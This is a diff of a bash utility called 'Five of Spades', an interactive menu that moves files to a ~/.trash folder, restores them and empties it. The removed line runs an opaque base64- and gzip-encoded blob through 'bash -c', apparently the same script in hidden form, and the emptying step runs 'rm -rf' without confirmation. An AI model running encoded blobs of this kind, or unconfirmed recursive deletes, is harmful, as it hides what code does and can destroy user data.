@@ -1,1 +1,114 @@
-bash -c "$(echo H4sICM7WdGcAA0ZpdmVfb2ZfU3BhZGVzAM1X32/TMBB+z19xlEqjk5quK9vDKh5gy9Ck8UOjAqGBIpNcVmtNXNlpRwXlb+fsNE7Shq6FDvBTe7Y/333f+c55/KjzhSedL0wNHef04/PXz/Y+HfR6191+7zjec668d95gYTqg/y+vPK+05NAsOSsMXTJ89C4v33wobD2yOY/hFSYTiISEdIhwzqcIIoJ3YxaiglMmQycimy8iXxmbH9P6Jy345gCNYIRMml8YDAW0ERrNb9rdeaOwNsAMf2djBfs7rB1LUa0b37fBPsMRppq0EaESg2dcYpAKyesPqcHeGSVb+b3lqMUeDLmCgPIDxlJMueaVgcJgIhFYEgJPUpQsSDX1d2wGqYAwoysydK3D1vvDEpd3Q9oCmKiJ5MkNKBZhOjOraI2YopyBGKdcJMq91++H5KTr5inBTJQ7hD4sQefUzHYD3XPhPcc7SCUVG6Cqszuvn7pwhYpctYxEUsTbnlQLfeSCF48pDf7I7VroY4L+ytPfwVsP/SC3Pau5piEsiq5EFkJ7DA1P30GYiYkEWskDPCFPsl9Z9WYKoZkZ6MI6uevd1uKu+kazft/OHNqZIglL070WTCmVfKOJrzUpTT5tkWcmGVZgj1qAWsz6jcc0q/U4KBv3WwtqL5IpG/FwEZcLA3KJ3TCeuI0+qBHiGLp9qGliORoqFjhz3QrPJ0mgy0ipWGVp65To2KD32ZuqO8NabXTPNWSMWTosjtU6abOvzY7ZyCO4voZ2BE07AZ8/9zVCIVw8JR/sfAN+dFzDaMeuKLlq3gxz7SLEVERDfby9TCelc6oR4EhhHRy9N+aelEKemLAhFFS5E5Fq7VTqVkEi7pToSKALbQVtaZh5S1lCzSSZwS2aviExnUgjiqZLS+e6bo6zIusaKW3OOstJvI2oeZef3atscUdW5aW5VXVDaOb2X4ibT2+krfW0XuAca2t9C9z/R+SpaWG01UboVEvRBhIPzNYXVH1OBYmYpKoa0IjcHw2XmP8r0clqF6W3ZpFbWUutRF6usxvEXfTo8wX6WRXdEnNvyicsNk9tW9gqrhaR6CvAU4x9vaFyB7Dgt2lX1N6GunXumuuwCDOk1Lcbts79C9ppMj4SE/PMLWj/l+mP2VuokgVLLXV9ImRfh3PzptKPbCs5+bGkekxRRAX7+8tQGdsD+y7TfnAMl2EeihZPfyeUeCjln6lSyolvyaQPzGNw6j5ynZ9o0NnChA8AAA== | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+GREEN='\033[1;32m'
+RED='\033[1;31m'
+YELLOW='\033[1;33m'
+
+# Menu for the Five of Spades Card
+five_of_spades_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      __________________________________________________________________________"
+    echo "     |                              Five of Spades                             |"
+    echo "     |                          Delete Files or Directories                    |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card provides a secure and interactive way to delete files        |"
+    echo "     |  and directories while ensuring safety and recovery options.            |"
+    echo "     |                                                                         |"
+    echo "     |  1. Delete a file                                                      |"
+    echo "     |  2. Delete a directory                                                 |"
+    echo "     |  3. View trash bin                                                     |"
+    echo "     |  4. Restore a file from trash bin                                      |"
+    echo "     |  5. Empty trash bin                                                    |"
+    echo "     |  6. Exit                                                               |"
+    echo "     |_________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) delete_file ;;
+        2) delete_directory ;;
+        3) view_trash_bin ;;
+        4) restore_file ;;
+        5) empty_trash_bin ;;
+        6) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; five_of_spades_menu ;;
+    esac
+}
+
+# Function to delete a file
+delete_file() {
+    clear
+    echo -e "${CYAN}Delete a File${RESET}"
+    read -p "Enter the file path to delete: " file_path
+
+    if [[ -f $file_path ]]; then
+        mv "$file_path" ~/.trash/
+        echo -e "${GREEN}File moved to trash bin: $file_path${RESET}"
+    else
+        echo -e "${RED}Error: File does not exist.${RESET}"
+    fi
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Function to delete a directory
+delete_directory() {
+    clear
+    echo -e "${CYAN}Delete a Directory${RESET}"
+    read -p "Enter the directory path to delete: " dir_path
+
+    if [[ -d $dir_path ]]; then
+        mv "$dir_path" ~/.trash/
+        echo -e "${GREEN}Directory moved to trash bin: $dir_path${RESET}"
+    else
+        echo -e "${RED}Error: Directory does not exist.${RESET}"
+    fi
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Function to view the trash bin
+view_trash_bin() {
+    clear
+    echo -e "${CYAN}Trash Bin Contents${RESET}"
+    ls -lh ~/.trash/
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Function to restore a file or directory from the trash bin
+restore_file() {
+    clear
+    echo -e "${CYAN}Restore a File or Directory from Trash Bin${RESET}"
+    read -p "Enter the name of the file or directory to restore: " item_name
+
+    if [[ -e ~/.trash/$item_name ]]; then
+        mv ~/.trash/$item_name ./
+        echo -e "${GREEN}Restored: $item_name${RESET}"
+    else
+        echo -e "${RED}Error: Item not found in trash bin.${RESET}"
+    fi
+
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Function to empty the trash bin
+empty_trash_bin() {
+    clear
+    echo -e "${YELLOW}Emptying Trash Bin...${RESET}"
+    rm -rf ~/.trash/*
+    echo -e "${GREEN}Trash bin emptied.${RESET}"
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    five_of_spades_menu
+}
+
+# Ensure trash bin directory exists
+mkdir -p ~/.trash
+
+five_of_spades_menu
